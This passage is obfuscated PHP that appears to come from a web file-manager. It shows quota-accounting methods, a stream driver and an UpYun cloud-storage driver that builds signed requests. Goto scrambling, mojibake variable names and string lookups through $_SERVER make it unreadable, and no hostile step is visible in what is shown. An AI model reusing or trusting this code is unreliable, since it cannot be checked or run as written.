$A©ﬁì„áãì[$f›“ﬂ”—¶Î[77]]); } $this->saveAll($BÎı·¨ŒŸÔ); goto d◊ò∂¬∞–ﬁ; B∏œŒ‡˜ç≠: $fìÃ“ñ÷©’[] = $aÏµå∑≠ Ã; $fìÃ“ñ÷©’ = array_to_keyvalue($fìÃ“ñ÷©’, $f›“ﬂ”—¶Î[369]); foreach ($fìÃ“ñ÷©’ as $FÇìÍÀ»∆œ => $A©ﬁì„áãì) { $fìÃ“ñ÷©’[$FÇìÍÀ»∆œ][$f›“ﬂ”—¶Î[2360]] = $fìÃ“ñ÷©’[$FÇìÍÀ»∆œ][$f›“ﬂ”—¶Î[77]]; $fìÃ“ñ÷©’[$FÇìÍÀ»∆œ][$f›“ﬂ”—¶Î[77]] = 0; } goto EåŒ‚¶á±›; BåêÜ”Â«À: $f›“ﬂ”—¶Î =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->sourceCacheClear($AÉà∆òƒ…ç); $aÏµå∑≠ Ã = $this->sourceInfo($AÉà∆òƒ…ç); goto dŒÜÍèÔ˜“; d◊ò∂¬∞–ﬁ: } public function userSpaceReset($d¡Ã¢‹âÍü = false) { $C¯è‘é≥ÿª =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eæ¿ñÆﬂè¿ = $this->where(array($C¯è‘é≥ÿª[371] => self::TYPE_USER, $C¯è‘é≥ÿª[456] => $d¡Ã¢‹âÍü, $C¯è‘é≥ÿª[370] => 0))->sum($C¯è‘é≥ÿª[77]); Model($C¯è‘é≥ÿª[474])->userEdit($d¡Ã¢‹âÍü, array($C¯è‘é≥ÿª[2092] => $eæ¿ñÆﬂè¿)); } public function targetSpaceUpdate($fâñÑÒì¨é, $a“üóﬁ©“î) { $b¬©„ÕÇ´À =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$a“üóﬁ©“î) { return; } if (!in_array($fâñÑÒì¨é, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $AáÈóºƒ—• = $this->targetSpaceSize($fâñÑÒì¨é, $a“üóﬁ©“î); if ($fâñÑÒì¨é == self::TYPE_USER) { Model($b¬©„ÕÇ´À[474])->userEdit($a“üóﬁ©“î, array($b¬©„ÕÇ´À[2092] => $AáÈóºƒ—•)); } else { if ($fâñÑÒì¨é == self::TYPE_GROUP) { Model($b¬©„ÕÇ´À[458])->groupEdit($a“üóﬁ©“î, array($b¬©„ÕÇ´À[2092] => $AáÈóºƒ—•)); } } } public function targetSpaceSize($C£Ù‰£∏¬‘, $d¶ÁƒÊáé£) { goto Fœæí◊òúÉ; fåôèÌ∫å”: return $EøÛΩÈûÁ¬; goto e‹ØâêÕ¯È; EÆ≈üä·∞¿: $EøÛΩÈûÁ¬ = floatval($bÛ†äááÜÔ[$d≤√óÏ˘Ï[77]]); $eÑØ˜◊ø∞Ö = array($d≤√óÏ˘Ï[525] => array($d≤√óÏ˘Ï[483], $d≤√óÏ˘Ï[470] . $bÛ†äááÜÔ[$d≤√óÏ˘Ï[369]] . $d≤√óÏ˘Ï[484])); $Eº§´‹“å§ = Model($d≤√óÏ˘Ï[395])->field($d≤√óÏ˘Ï[383])->where($eÑØ˜◊ø∞Ö)->select(); goto e⁄ÛÃä€Ω»; e⁄ÛÃä€Ω»: $Eº§´‹“å§ = array_to_keyvalue($Eº§´‹“å§, $d≤√óÏ˘Ï[33], $d≤√óÏ˘Ï[369]); $Eº§´‹“å§ = array_unique(array_filter($Eº§´‹“å§)); if ($Eº§´‹“å§) { $eÑØ˜◊ø∞Ö = array($d≤√óÏ˘Ï[383] => array($d≤√óÏ˘Ï[384], $Eº§´‹“å§)); $EøÛΩÈûÁ¬ += floatval($this->where($eÑØ˜◊ø∞Ö)->sum($d≤√óÏ˘Ï[77])); } goto fåôèÌ∫å”; Fœæí◊òúÉ: $d≤√óÏ˘Ï =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bÛ†äááÜÔ = $this->sourceRoot($C£Ù‰£∏¬‘, $d¶ÁƒÊáé£, !0); if (!$bÛ†äááÜÔ) { return 0; } goto EÆ≈üä·∞¿; e‹ØâêÕ¯È: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($c‡∏âÂ™™∫) { return $this->fileTypeProfile($c‡∏âÂ™™∫, SourceModel::TYPE_USER); } public function groupFileTypeProfile($fé¿∞∆Ã·ù) { return $this->fileTypeProfile($fé¿∞∆Ã·ù, SourceModel::TYPE_GROUP); } private function fileTypeProfile($bÂÇ∫ı¡Èû, $bàÒˆ≤Øæ¡) { goto Eøå¡ŒÎ©∆; Eøå¡ŒÎ©∆: $Dô…È≠ÌªŒ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e ÑŸ∫Ûó» = $Dô…È≠ÌªŒ[2361] . $bÂÇ∫ı¡Èû . $Dô…È≠ÌªŒ[70] . $bàÒˆ≤Øæ¡; $B…ìÛà∆ﬂ“ = Cache::get($e ÑŸ∫Ûó»); goto Bóçàˆ≤ô¿; a–∑Üáç◊¡: $f¢ñ©ÉÈ…¡ = array(); $f¢ñ©ÉÈ…¡[$Dô…È≠ÌªŒ[2362]] = array($Dô…È≠ÌªŒ[2363] => LNG($Dô…È≠ÌªŒ[2362]), $Dô…È≠ÌªŒ[2364] => $this->where($f«Œ¡º∑Ãì)->count(), $Dô…È≠ÌªŒ[520] => $this->where($f«Œ¡º∑Ãì)->sum($Dô…È≠ÌªŒ[77])); $DÉ£‚©öåÕ = KodIO::fileTypeList(); goto cÍÁ«¬íïß; Bóçàˆ≤ô¿: if ($B…ìÛà∆ﬂ“) { return $B…ìÛà∆ﬂ“; } $f«Œ¡º∑Ãì = array($Dô…È≠ÌªŒ[518] => 0); if ($bÂÇ∫ı¡Èû != !1) { $f«Œ¡º∑Ãì[$Dô…È≠ÌªŒ[456]] = $bÂÇ∫ı¡Èû; $f«Œ¡º∑Ãì[$Dô…È≠ÌªŒ[371]] = $bàÒˆ≤Øæ¡; } goto a–∑Üáç◊¡; cÍÁ«¬íïß: foreach ($DÉ£‚©öåÕ as $c“Ü¡’òâÜ => $c›«–íèîÛ) { $f«Œ¡º∑Ãì[$Dô…È≠ÌªŒ[372]] = $this->fileTypeWhere($c“Ü¡’òâÜ); $f¢ñ©ÉÈ…¡[$c“Ü¡’òâÜ] = array($Dô…È≠ÌªŒ[2363] => $c›«–íèîÛ[$Dô…È≠ÌªŒ[28]], $Dô…È≠ÌªŒ[2364] => $this->where($f«Œ¡º∑Ãì)->count(), $Dô…È≠ÌªŒ[520] => $this->where($f«Œ¡º∑Ãì)->sum($Dô…È≠ÌªŒ[77])); } Cache::set($e ÑŸ∫Ûó», $f¢ñ©ÉÈ…¡, 1200); return $f¢ñ©ÉÈ…¡; goto d‰‹ÏÏÖÊÿ; d‰‹ÏÏÖÊÿ: } public function fileNameExist($dı◊çâóø∆, $F∑ßŒ∏™≤) { $Féáæ ‰˘ﬁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Aß›ÊêÜ©º = $this->childList($dı◊çâóø∆); foreach ($Aß›ÊêÜ©º as $dº≈œ–∂òç) { if ($dº≈œ–∂òç[$Féáæ ‰˘ﬁ[28]] == $F∑ßŒ∏™≤) { return $dº≈œ–∂òç[$Féáæ ‰˘ﬁ[369]]; } } return !1; } public function childList($dóöåôàî∫) { goto fﬁŒ≠”ò‰÷; fﬁŒ≠”ò‰÷: $Cüﬂ¯›†“ô =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EÈ«˘Çà“œ = $Cüﬂ¯›†“ô[2342] . $dóöåôàî∫; if (isset(self::$cacheChildList[$EÈ«˘Çà“œ])) { return self::$cacheChildList[$EÈ«˘Çà“œ]; } goto eüøΩ≥£ã¿; eüøΩ≥£ã¿: $fäàÓëπÕ∏ = array($Cüﬂ¯›†“ô[461] => intval($dóöåôàî∫), $Cüﬂ¯›†“ô[397] => 0); $c‰úøÁúº√ = $this->where($fäàÓëπÕ∏)->select(); $c‰úøÁúº√ = $c‰úøÁúº√ ? $c‰úøÁúº√ : array(); goto b¶‹¡ÇËçâ; b¶‹¡ÇËçâ: self::$cacheChildList[$EÈ«˘Çà“œ] = $c‰úøÁúº√; foreach ($c‰úøÁúº√ as $bΩ¯àô†¿Ú) { $EÈ«˘Çà“œ = $Cüﬂ¯›†“ô[410] . $bΩ¯àô†¿Ú[$Cüﬂ¯›†“ô[369]]; self::$cacheSourceInfo[$EÈ«˘Çà“œ] = $bΩ¯àô†¿Ú; } return $c‰úøÁúº√; goto fÒ¶†çâàß; fÒ¶†çâàß: } public function fileNameAuto($aç◊™áá·á, $a«û◊÷ËÕû, $dÊìêßñ™¬ = REPEAT_RENAME, $c„ﬁŒﬂˆÈ® = false) { $c»≤ƒÑΩëØ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dëß„‹Úç÷ = $this->childList($aç◊™áá·á); $Dä·µ¶£¡π = array_to_keyvalue($dëß„‹Úç÷, $c»≤ƒÑΩëØ[33], $c»≤ƒÑΩëØ[28]); return $this->fileNameAutoGet($Dä·µ¶£¡π, $a«û◊÷ËÕû, $dÊìêßñ™¬, $c„ﬁŒﬂˆÈ®); } public function fileNameAutoGet($b‰¶ïÖ⁄á∏, $c’ôıÚÙ⁄Æ, $FÁó‘ì’í§, $Fíäï§îûÙ) { $fÉ´•á¨† =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($FÁó‘ì’í§ == REPEAT_REPLACE || !$b‰¶ïÖ⁄á∏ || !in_array_not_case($c’ôıÚÙ⁄Æ, $b‰¶ïÖ⁄á∏) || $Fíäï§îûÙ && $FÁó‘ì’í§ != REPEAT_RENAME_FOLDER) { return $c’ôıÚÙ⁄Æ; } if ($FÁó‘ì’í§ == REPEAT_SKIP) { return !1; } $f†Î‹ˆºÇˆ = $fÉ´•á¨†[91] . get_path_ext($c’ôıÚÙ⁄Æ); $f†Î‹ˆºÇˆ = $f†Î‹ˆºÇˆ == $fÉ´•á¨†[91] || $Fíäï§îûÙ ? $fÉ´•á¨†[33] : $f†Î‹ˆºÇˆ; for ($d”·üÍÛ·è = 1; $d”·üÍÛ·è <= count($b‰¶ïÖ⁄á∏) + 1; $d”·üÍÛ·è++) { $D„ÿäÌ∏±ï = substr($c’ôıÚÙ⁄Æ, 0, strlen($c’ôıÚÙ⁄Æ) - strlen($f†Î‹ˆºÇˆ)); $B…æõ˜–£• = $D„ÿäÌ∏±ï . "\50{$d”·üÍÛ·è}\51{$f†Î‹ˆºÇˆ}"; if (!in_array_not_case($B…æõ˜–£•, $b‰¶ïÖ⁄á∏)) { return $B…æõ˜–£•; } } } } goto BçãäΩí´Œ; cœËàæ∏Ú€: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($d∑”Ù—Ó¬–, $dÒ†Û∏¶Òà = 0) { parent::__construct(); $this->source = $d∑”Ù—Ó¬–; $this->sourceSize = $dÒ†Û∏¶Òà; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($D»Ãâ≤∏ÑÒ = false) { return $this->sourceSize; } public function getContent($B¥»˘Çò¥Õ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $e»⁄ø≤Ø¥¶ = ftell($this->source); $b∑øÃ≥äÑ∞ = @fread($this->source, $this->sourceSize); fseek($this->source, $e»⁄ø≤Ø¥¶); return $b∑øÃ≥äÑ∞; } } public function fileSubstr($dï•°π≤≈™ = false, $bÌã√Àœéœ = 0, $fö¯æêïÇë = 0) { if (!$fö¯æêïÇë) { $fö¯æêïÇë = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $bÌã√Àœéœ, $fö¯æêïÇë); } if ($this->sourceType == self::TYPE_FILE) { $D™ÕﬁüÇ∑Ç = ftell($this->source); fseek($this->source, $D™ÕﬁüÇ∑Ç + $bÌã√Àœéœ); $CÓÈ‹¨üì∑ = @fread($this->source, $fö¯æêïÇë); fseek($this->source, $D™ÕﬁüÇ∑Ç); return $CÓÈ‹¨üì∑; } } public function hashMd5($e∂•Ç≠ïﬂ† = false) { return md5($this->getContent()); } public static function hash($dŒ‘∆ ÊΩ∫, $e°ééù£ã  = 0) { $cãΩëƒ“ó© = new PathDriverStream($dŒ‘∆ ÊΩ∫, $e°ééù£ã ); return $cãΩëƒ“ó©->hashSimple($dŒ‘∆ ÊΩ∫); } public static function md5($eöàŸÒ¿‹œ, $A¶Æ°ÊÃì– = 0) { $dãÆŸÌÉ‰≠ = new PathDriverStream($eöàŸÒ¿‹œ, $A¶Æ°ÊÃì–); return $dãÆŸÌÉ‰≠->hashMd5($eöàŸÒ¿‹œ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\x3a\x2f\57\x76\x30\x2e\x61\160\x69\56\x75\160\171\165\x6e\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($AËÂê¯ûÇ‘) { parent::__construct(); $this->_init($AËÂê¯ûÇ‘); } public function _init($aæ‚˜Ö≠¿¨) { foreach ($aæ‚˜Ö≠¿¨ as $b»Òáóøù≠ => $BÛ€‰∏≠Ùä) { if (isset($this->{$b»Òáóøù≠})) { $this->{$b»Òáóøù≠} = $BÛ€‰∏≠Ùä; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[Ä¿¡‡öóµŸﬂ‡][1244], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($EÎ‡§Ë•Íè, $A⁄Áª∫·í– = "\107\105\124") { $cò∏´Ç∆∆‹ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cÉ®è“˜Ê† = gmdate($cò∏´Ç∆∆‹[1208]); $C≤†Îÿ÷©ß = base64_encode(hash_hmac($cò∏´Ç∆∆‹[1245], "{$A⁄Áª∫·í–}\x26{$EÎ‡§Ë•Íè}\x26{$cÉ®è“˜Ê†}", md5("{$this->userpass}"), !0)); $aÜÒ∏ŸÌÜﬁ = array("\101\x75\x74\x68\x6f\x72\151\x7a\141\x74\151\x6f\156\72\125\x50\131\125\x4e\x20{$this->username}\72{$C≤†Îÿ÷©ß}", "\104\141\164\x65\x3a{$cÉ®è“˜Ê†}"); return $aÜÒ∏ŸÌÜﬁ; } public function ussRequest($dñ‰∏àÀÁí, $D“õ≥¡ÚœŒ = "\x47\x45\124", $B¥ÈÏÀ€ıø = false, $A¶ÉƒÜ¬≤à = false, $F”›†‹πΩí = false) { goto eãæœ•«ê®; eãæœ•«ê®: $eÛ‘Æ‘–â⁄ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dñ‰∏àÀÁí = trim($dñ‰∏àÀÁí, $eÛ‘Æ‘–â⁄[8]); $FóòﬁÔÓÓö = "\57{$this->bucket}\57{$dñ‰∏àÀÁí}"; goto eÇÒ∞¨∑±¡; eÇÒ∞¨∑±¡: $aŒ≤∏°ﬁ’∏ = $this->ussHeaders($FóòﬁÔÓÓö, $D“õ≥¡ÚœŒ); if ($A¶ÉƒÜ¬≤à) { $aŒ≤∏°ﬁ’∏ = array_merge($aŒ≤∏°ﬁ’∏, $A¶ÉƒÜ¬≤à); } $Fû¢Ë—ù≠≥ = url_request($this->endpoint . $FóòﬁÔÓÓö, $D“õ≥¡ÚœŒ, $B¥ÈÏÀ€ıø, $aŒ≤∏°ﬁ’∏, $F”›†‹πΩí); goto EºÓÈ›Áç±; EºÓÈ›Áç±: if (!$Fû¢Ë—ù≠≥) { return array($eÛ‘Æ‘–â⁄[1036] => !1, $eÛ‘Æ‘–â⁄[1038] => $eÛ‘Æ‘–â⁄[1246]); } if (strtolower($D“õ≥¡ÚœŒ) == $eÛ‘Æ‘–â⁄[184] || in_array($Fû¢Ë—ù≠≥[$eÛ‘Æ‘–â⁄[1036]], array($eÛ‘Æ‘–â⁄[1104], $eÛ‘Æ‘–â⁄[1247]))) { $B¥ÈÏÀ€ıø = $Fû¢Ë—ù≠≥[$eÛ‘Æ‘–â⁄[1248]]; } else { $B¥ÈÏÀ€ıø = json_decode($Fû¢Ë—ù≠≥[$eÛ‘Æ‘–â⁄[1038]], !0); if (!$B¥ÈÏÀ€ıø) { $B¥ÈÏÀ€ıø = $Fû¢Ë—ù≠≥[$eÛ‘Æ‘–â⁄[1038]]; } else { if (!$Fû¢Ë—ù≠≥[$eÛ‘Æ‘–â⁄[689]] && isset($B¥ÈÏÀ€ıø[$eÛ‘Æ‘–â⁄[1249]])) { $B¥ÈÏÀ€ıø = $B¥ÈÏÀ€ıø[$eÛ‘Æ‘–â⁄[1249]]; } } } return array($eÛ‘Æ‘–â⁄[1036] => $Fû¢Ë—ù≠≥[$eÛ‘Æ‘–â⁄[689]], $eÛ‘Æ‘–â⁄[1038] => $B¥ÈÏÀ€ıø); goto Cãå∆¢ÉΩ¶; Cãå∆¢ÉΩ¶: } public function mkfile($AàÎŒûΩÖ•, $Aä‘«àÓ‰Ω = '', $b™ﬁ±⁄…©˘ = REPEAT_RENAME) { if ($this->setContent($AàÎŒûΩÖ•, $Aä‘«àÓ‰Ω)) { return $this->getPathOuter($AàÎŒûΩÖ•); } return !1; } public function mkdir($Aöì®ïã©Ë, $d¥“”¡à€¿ = REPEAT_SKIP) { $fø¢ªß¡ëÁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a®¡Ñª∆¶ = trim($Aöì®ïã©Ë, $fø¢ªß¡ëÁ[8]); if ($this->_isFolder($a®¡Ñª∆¶)) { return $this->getPathOuter($a®¡Ñª∆¶); } $d·ÁÜﬂ“÷à = array($fø¢ªß¡ëÁ[1250]); $Cä≤ôº‡‰º = $this->ussRequest($a®¡Ñª∆¶, $fø¢ªß¡ëÁ[212], !1, $d·ÁÜﬂ“÷à); return $Cä≤ôº‡‰º[$fø¢ªß¡ëÁ[1036]] ? $this->getPathOuter($a®¡Ñª∆¶) : !1; } public function copyFile($d‡ûêëÖûÏ, $bâ·≤¯Ìâ) { $d‘òÜ£Ú∂ñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Aíˆ≈ß˜π˜ = array($d‘òÜ£Ú∂ñ[1251] . "\x2f{$this->bucket}\x2f{$d‡ûêëÖûÏ}", $d‘òÜ£Ú∂ñ[1252]); $E˘ô¥∫íˆ— = $this->ussRequest($bâ·≤¯Ìâ, $d‘òÜ£Ú∂ñ[214], !1, $Aíˆ≈ß˜π˜); return $E˘ô¥∫íˆ—[$d‘òÜ£Ú∂ñ[1036]] ? !0 : !1; } public function moveFile($B‡ò©¨‰ùÇ, $cÃè‰Ü¢ñü) { $Cè¢ﬂ⁄Ïﬁé =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D«⁄•‹É§° = array($Cè¢ﬂ⁄Ïﬁé[1253] . "\x2f{$this->bucket}\57{$B‡ò©¨‰ùÇ}", $Cè¢ﬂ⁄Ïﬁé[1252]); $Dﬁ∆◊´úÌñ = $this->ussRequest($cÃè‰Ü¢ñü, $Cè¢ﬂ⁄Ïﬁé[214], !1, $D«⁄•‹É§°); return $Dﬁ∆◊´úÌñ[$Cè¢ﬂ⁄Ïﬁé[1036]] ? !0 : !1; } public function delFile($B∞ã«ƒ±‘Ã) { $E¯”Ø‘íÇ• =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BÏ¥»‡ìèŒ = $this->ussRequest($B∞ã«ƒ±‘Ã, $E¯”Ø‘íÇ•[1254]); return $BÏ¥»‡ìèŒ[$E¯”Ø‘íÇ•[1036]] ? !0 : !1; } public function delFolder($dêÇÑÓª∏ò) { $Fı∏ªàßÓ◊ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b¢®’˜¨ﬂ∏ = $this->listAll($dêÇÑÓª∏ò); krsort($b¢®’˜¨ﬂ∏); foreach ($b¢®’˜¨ﬂ∏ as $d‚Òä≤ªΩæ) { $this->ussRequest($d‚Òä≤ªΩæ[$Fı∏ªàßÓ◊[75]], $Fı∏ªàßÓ◊[1254]); } return $this->ussRequest($dêÇÑÓª∏ò, $Fı∏ªàßÓ◊[1254]); } public function rename($aÜ‰‹ÿ∑É≤, $cÎ€⁄›ôì™) { if ($this->isFile($aÜ‰‹ÿ∑É≤)) { $cÎ€⁄›ôì™ = get_path_father($aÜ‰‹ÿ∑É≤) . $cÎ€⁄›ôì™; return $this->moveFile($aÜ‰‹ÿ∑É≤, $cÎ€⁄›ôì™); } return $this->renameObject($aÜ‰‹ÿ∑É≤, $cÎ€⁄›ôì™); } public function fileInfo($BΩÏ±œºÆÉ, $Eè»ËπøÑÂ = false, $AÀ∏·áÌâ¶ = array()) { $d†‹õ…∆Í =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($Eè»ËπøÑÂ) { return array($d†‹õ…∆Í[28] => $this->pathThis($BΩÏ±œºÆÉ), $d†‹õ…∆Í[75] => $this->getPathOuter($d†‹õ…∆Í[8] . $BΩÏ±œºÆÉ), $d†‹õ…∆Í[29] => $d†‹õ…∆Í[167], $d†‹õ…∆Í[77] => isset($AÀ∏·áÌâ¶[$d†‹õ…∆Í[325]]) ? $AÀ∏·áÌâ¶[$d†‹õ…∆Í[325]] : 0, $d†‹õ…∆Í[160] => $this->ext($BΩÏ±œºÆÉ)); } $bÕ¿Õ¥¿€Ñ = array($d†‹õ…∆Í[28] => $this->pathThis($BΩÏ±œºÆÉ), $d†‹õ…∆Í[75] => $this->getPathOuter($d†‹õ…∆Í[8] . $BΩÏ±œºÆÉ), $d†‹õ…∆Í[29] => $d†‹õ…∆Í[167], $d†‹õ…∆Í[187] => 0, $d†‹õ…∆Í[107] => isset($B¬ı˘Æ‡ﬁœ[$d†‹õ…∆Í[1255]]) ? $B¬ı˘Æ‡ﬁœ[$d†‹õ…∆Í[1255]] : 0, $d†‹õ…∆Í[77] => isset($AÀ∏·áÌâ¶[$d†‹õ…∆Í[325]]) ? $AÀ∏·áÌâ¶[$d†‹õ…∆Í[325]] : 0, $d†‹õ…∆Í[160] => $this->ext($BΩÏ±œºÆÉ), $d†‹õ…∆Í[188] => !0, $d†‹õ…∆Í[189] => !0); if (empty($AÀ∏·áÌâ¶)) { $AÀ∏·áÌâ¶ = $this->objectMeta($BΩÏ±œºÆÉ); if (!$AÀ∏·áÌâ¶) { return $bÕ¿Õ¥¿€Ñ; } $bÕ¿Õ¥¿€Ñ[$d†‹õ…∆Í[187]] = $AÀ∏·áÌâ¶[$d†‹õ…∆Í[1256]]; $bÕ¿Õ¥¿€Ñ[$d†‹õ…∆Í[107]] = $AÀ∏·áÌâ¶[$d†‹õ…∆Í[1257]]; $bÕ¿Õ¥¿€Ñ[$d†‹õ…∆Í[77]] = $AÀ∏·áÌâ¶[$d†‹õ…∆Í[77]]; } return $bÕ¿Õ¥¿€Ñ; } public function folderInfo($aÃ©†ó∏∂ƒ, $f¥’≈í‡Üé = false) { $Bé„Ã«ç∞â =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($f¥’≈í‡Üé) { return array($Bé„Ã«ç∞â[28] => $this->pathThis($aÃ©†ó∏∂ƒ), $Bé„Ã«ç∞â[75] => $this->getPathOuter($Bé„Ã«ç∞â[8] . $aÃ©†ó∏∂ƒ), $Bé„Ã«ç∞â[29] => $Bé„Ã«ç∞â[76]); } $a‡Ûîòá‚· = array($Bé„Ã«ç∞â[28] => $this->pathThis($aÃ©†ó∏∂ƒ), $Bé„Ã«ç∞â[75] => $this->getPathOuter($Bé„Ã«ç∞â[8] . $aÃ©†ó∏∂ƒ), $Bé„Ã«ç∞â[29] => $Bé„Ã«ç∞â[76], $Bé„Ã«ç∞â[187] => 0, $Bé„Ã«ç∞â[107] => isset($F∞àÛ˜“‘‚[$Bé„Ã«ç∞â[1255]]) ? $F∞àÛ˜“‘‚[$Bé„Ã«ç∞â[1255]] : 0, $Bé„Ã«ç∞â[1165] => !0, $Bé„Ã«ç∞â[1166] => !0); if (empty($eˆ±ﬂ®¶ˆö)) { $eˆ±ﬂ®¶ˆö = $this->objectMeta($aÃ©†ó∏∂ƒ); if (!$eˆ±ﬂ®¶ˆö) { return $a‡Ûîòá‚·; } $a‡Ûîòá‚·[$Bé„Ã«ç∞â[187]] = $eˆ±ﬂ®¶ˆö[$Bé„Ã«ç∞â[1256]]; $a‡Ûîòá‚·[$Bé„Ã«ç∞â[107]] = $eˆ±ﬂ®¶ˆö[$Bé„Ã«ç∞â[1257]]; } return $a‡Ûîòá‚·; } private function fileList($BÖæöÒ©ï’, $fòÜÖ¿Êªâ = 0, $dûõïìõäò = 1000) { $DÆôæπÛˆÑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Aπç›∫¶è´ = array($DÆôæπÛˆÑ[1258], $DÆôæπÛˆÑ[1259] . $dûõïìõäò); if ($fòÜÖ¿Êªâ) { $Aπç›∫¶è´[] = $DÆôæπÛˆÑ[1260] . $fòÜÖ¿Êªâ; } $a¢ÈòºÍÇë = $this->ussRequest($BÖæöÒ©ï’, $DÆôæπÛˆÑ[216], !1, $Aπç›∫¶è´); return !$a¢ÈòºÍÇë[$DÆôæπÛˆÑ[1036]] ? !1 : $a¢ÈòºÍÇë[$DÆôæπÛˆÑ[1038]]; } public function listPath($eÉ∂˜‡Ÿß», $FŸ≠€”óñµ = false) { goto F–’Ç⁄È≥¥; bú®¨–¡ƒò: $Dˆà≥◊Ì”° = $Cï‰êéœ ÿ = array(); $fÖÜÇÑÏØÖ = rtrim($eÉ∂˜‡Ÿß», $F‚úÿÜË”“[8]) . $F‚úÿÜË”“[8]; while (!0) { $A¨ìÒ≥è¶⁄ = $this->fileList($eÉ∂˜‡Ÿß», $aä¥Õ‘π„¶, $AΩπû≈îè’); if (!$A¨ìÒ≥è¶⁄) { return !1; } $aä¥Õ‘π„¶ = isset($A¨ìÒ≥è¶⁄[$F‚úÿÜË”“[1261]]) ? $A¨ìÒ≥è¶⁄[$F‚úÿÜË”“[1261]] : $F‚úÿÜË”“[33]; $C∫¢Òœ∏¢Ô = isset($A¨ìÒ≥è¶⁄[$F‚úÿÜË”“[1262]]) ? $A¨ìÒ≥è¶⁄[$F‚úÿÜË”“[1262]] : array(); foreach ($C∫¢Òœ∏¢Ô as $AÂõÕÀ‡äë) { if ($AÂõÕÀ‡äë[$F‚úÿÜË”“[29]] == $F‚úÿÜË”“[76]) { $Dˆà≥◊Ì”°[] = $this->folderInfo($fÖÜÇÑÏØÖ . $AÂõÕÀ‡äë[$F‚úÿÜË”“[28]], $FŸ≠€”óñµ, $AÂõÕÀ‡äë); } else { $Cï‰êéœ ÿ[] = $this->fileInfo($fÖÜÇÑÏØÖ . $AÂõÕÀ‡äë[$F‚úÿÜË”“[28]], $FŸ≠€”óñµ, $AÂõÕÀ‡äë); } } if (count($C∫¢Òœ∏¢Ô) < $AΩπû≈îè’) { break; } } goto e¶ßíöÊò¬; e¶ßíöÊò¬: return array($F‚úÿÜË”“[74] => $Dˆà≥◊Ì”°, $F‚úÿÜË”“[73] => $Cï‰êéœ ÿ); goto Fâ©≤¶ÕÇ¢; F–’Ç⁄È≥¥: $F‚úÿÜË”“ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aä¥Õ‘π„¶ = $F‚úÿÜË”“[33]; $AΩπû≈îè’ = 1000; goto bú®¨–¡ƒò; Fâ©≤¶ÕÇ¢: } private function recursionAllFiles($CóÓ™†ÔÓê, &$aÆæãõ¯”ô) { $C‚ü≤Ã·ıÍ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a»≠Èë¨Àó = $C‚ü≤Ã·ıÍ[33]; $Aê˘µûë…‚ = 1000; $aÛ¬é™ß≤ÿ = $bô‰©Ø©ô‡ = array(); $cúÛŒÿÚÊä = rtrim($CóÓ™†ÔÓê, $C‚ü≤Ã·ıÍ[8]) . $C‚ü≤Ã·ıÍ[8]; while (!0) { $C“π—úÏâ≈ = $this->fileList($CóÓ™†ÔÓê, $a»≠Èë¨Àó, $Aê˘µûë…‚); if (!$C“π—úÏâ≈) { return !1; } $a»≠Èë¨Àó = isset($C“π—úÏâ≈[$C‚ü≤Ã·ıÍ[1261]]) ? $C“π—úÏâ≈[$C‚ü≤Ã·ıÍ[1261]] : $C‚ü≤Ã·ıÍ[33]; $d´¥±∞çÇ· = isset($C“π—úÏâ≈[$C‚ü≤Ã·ıÍ[1262]]) ? $C“π—úÏâ≈[$C‚ü≤Ã·ıÍ[1262]] : array(); foreach ($d´¥±∞çÇ· as $Dß®ã‹ÇáÆ) { $B£éŒ”—çπ = array($C‚ü≤Ã·ıÍ[75] => $cúÛŒÿÚÊä . $Dß®ã‹ÇáÆ[$C‚ü≤Ã·ıÍ[28]], $C‚ü≤Ã·ıÍ[76] => $Dß®ã‹ÇáÆ[$C‚ü≤Ã·ıÍ[29]] == $C‚ü≤Ã·ıÍ[76] ? 1 : 0, $C‚ü≤Ã·ıÍ[77] => isset($Dß®ã‹ÇáÆ[$C‚ü≤Ã·ıÍ[325]]) ? $Dß®ã‹ÇáÆ[$C‚ü≤Ã·ıÍ[325]] : 0); $aÆæãõ¯”ô[] = $B£éŒ”—çπ; if ($B£éŒ”—çπ[$C‚ü≤Ã·ıÍ[76]] == 1) { $this->recursionAllFiles($B£éŒ”—çπ[$C‚ü≤Ã·ıÍ[75]], $aÆæãõ¯”ô); } } if (count($d´¥±∞çÇ·) < $Aê˘µûë…‚) { break; } } } public function has($a—äíâƒ√ë, $aÆÁœπÇ©í = false, $b¡ﬁÂ∂áìå = true) 